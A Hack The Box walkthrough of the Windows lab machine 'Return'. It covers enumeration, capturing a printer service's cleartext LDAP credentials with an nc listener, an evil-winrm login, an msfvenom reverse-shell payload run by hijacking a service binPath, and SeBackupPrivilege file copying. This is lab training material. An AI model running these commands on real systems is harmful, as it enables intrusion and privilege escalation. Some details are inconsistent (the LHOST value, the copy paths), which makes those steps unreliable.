# Return HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Return-green?logo=hackthebox)](https://app.hackthebox.com/machines/401)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)](https://github.com/subhash00/HTB_Labs/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HTB_Labs/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

**Return** is an easy-level Windows machine on Hack The Box focused on exploiting network printer misconfigurations and abusing Windows privilege escalation techniques. The box demonstrates enumeration of Windows shares and services, credential capture via a network printer, WinRM initial foothold, privilege escalation using the Server Operators group, and finally leveraging SeBackupPrivilege to access the Administrator's desktop.

---

## Table of Contents

- [Scan and Enumeration](#scan-and-enumeration)
- [SMB and Service Discovery](#smb-and-service-discovery)
- [Abusing Printer Panel and Capturing Credentials](#abusing-printer-panel-and-capturing-credentials)
- [Initial Foothold via WinRM](#initial-foothold-via-winrm)
- [Privilege Escalation](#privilege-escalation)
- [Post Exploitation and Flag Capture](#post-exploitation-and-flag-capture)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Technical Notes](#technical-notes)

---

## Scan and Enumeration
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.241 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV -sC 10.129.95.241
```
- Scans all TCP ports, extracts open ports, and performs banner and script scanning on the detected ports.

---

## SMB and Service Discovery

```
enum4linux-ng -A 10.129.95.241
smbclient -L //10.129.95.241/
```
- Enumerates users, shares, domains, and more.
- Lists all available SMB shares.

---

## Abusing Printer Panel and Capturing Credentials

`nc -lvnp 389`
- Listens for LDAP connections, capturing cleartext credentials when configured in the Printer Admin Panel.

*Captured Credential:*
```
Username: svc-printer
Password: 1edFg43012!!
```

---

## Initial Foothold via WinRM

`evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'`
- Authenticates and spawns a WinRM shell as the captured domain user.

`net user svc-printer`
- Checks group memberships and privileges of the obtained account.

`services`
- Lists running services.

---

## Privilege Escalation

*Generate and transfer Meterpreter payload:*
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.129.95.241 LPORT=1447 -f exe > shell.exe
upload shell.exe
```

*Start Metasploit Handler:*
```

*Start Metasploit Handler:*

msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.48
set LPORT 1447
run
```

*Abuse Service to Execute Payload:*
```
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

- Modifies the VMTools service to run the shell and triggers Meterpreter.
- If session is unstable, re-run or try different services.

---

## Post Exploitation and Flag Capture

*Check Available Privileges:*
`whoami /priv`

*Abuse SeBackupPrivilege to Access Administrator Files:*
```
mkdir C:\temp\creds
robocopy /b C:\Users\Administrator\Desktop C:\temp\creds
cat C:\creds\root.txt
```
- Leverages backup privileges to copy inaccessible files and finally retrieves the root flag.

---

## Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
<img width="1513" height="847" alt="19" src="https://github.com/user-attachments/assets/fdda1804-15a1-4050-8963-0c08deba4fcd" />
<img width="1054" height="320" alt="18" src="https://github.com/user-attachments/assets/a7373ea4-355d-4286-bf15-dc2909d198aa" />
<img width="685" height="810" alt="17" src="https://github.com/user-attachments/assets/833cb303-babc-4e7e-9aba-094a4b027f60" />
<img width="765" height="841" alt="16" src="https://github.com/user-attachments/assets/03b4451b-0878-4acf-83ec-94be7e246f70" />
<img width="1197" height="656" alt="15" src="https://github.com/user-attachments/assets/de284b53-1ab5-4fb6-8703-ada562045f81" />
<img width="764" height="123" alt="14" src="https://github.com/user-attachments/assets/87ff5172-6424-41db-b22f-eded61b77567" />
<img width="1189" height="606" alt="13" src="https://github.com/user-attachments/assets/cbf57109-09d2-4b23-9d0e-6904e6e01643" />
<img width="817" height="203" alt="12" src="https://github.com/user-attachments/assets/b452b7a1-d761-496a-aff4-e3bef5496b95" />
<img width="863" height="249" alt="11" src="https://github.com/user-attachments/assets/2f12183c-4339-4ae9-a3fa-a20f4304d712" />
<img width="895" height="793" alt="10" src="https://github.com/user-attachments/assets/633effd2-6b5a-44e8-a7f2-26bdd6b2e1b2" />
<img width="1743" height="466" alt="9" src="https://github.com/user-attachments/assets/10bb85f3-4005-4d9e-aadb-044381af6ebe" />
<img width="961" height="282" alt="8" src="https://github.com/user-attachments/assets/5ce92af7-e915-449f-b075-26cdf7a5429e" />
<img width="862" height="268" alt="7" src="https://github.com/user-attachments/assets/2a0147e9-215d-40e5-8529-0aca42092e2c" />
<img width="1455" height="74" alt="6" src="https://github.com/user-attachments/assets/2386d468-ecf6-439f-a3ac-c63f0e18c956" />
<img width="828" height="291" alt="5" src="https://github.com/user-attachments/assets/ed540559-df53-4b82-b52e-75d02ae32e15" />
<img width="894" height="549" alt="4" src="https://github.com/user-attachments/assets/acbdbd9f-bd1a-44a4-a57e-882873ea1fba" />
<img width="828" height="299" alt="3" src="https://github.com/user-attachments/assets/06ff13d4-6c46-41e4-9c60-fc1ed00bae5d" />
<img width="1245" height="669" alt="2" src="https://github.com/user-attachments/assets/53d8366a-ef25-4cde-90fb-642dacd94d1f" />
<img width="908" height="77" alt="1" src="https://github.com/user-attachments/assets/bf489527-8021-4ede-ab26-01028dadcf8f" />

</details>

---

## Tools Used

- **nmap** – Port scanning and service detection
- **enum4linux-ng** – Windows and Samba enumeration
- **smbclient** – SMB share listing
- **nc (netcat)** – Listener for credentials
- **evil-winrm** – WinRM shell for Windows boxes
- **msfvenom/msfconsole** – Metasploit payload creation and handler
- **robocopy** – Copying as backup operator
- **sc.exe** – Windows Service Controller utility

---

## Technical Notes

- **Server Operators Group**: Members can control and reconfigure system services, often leading to privilege escalation if misconfigured.
- **SeBackupPrivilege**: Allows reading almost any file on the system by using tools like robocopy with the `/b` (backup) flag.
- **Service Abuse**: Overwriting the binPath of an enabled service lets you trigger arbitrary code as SYSTEM.

---
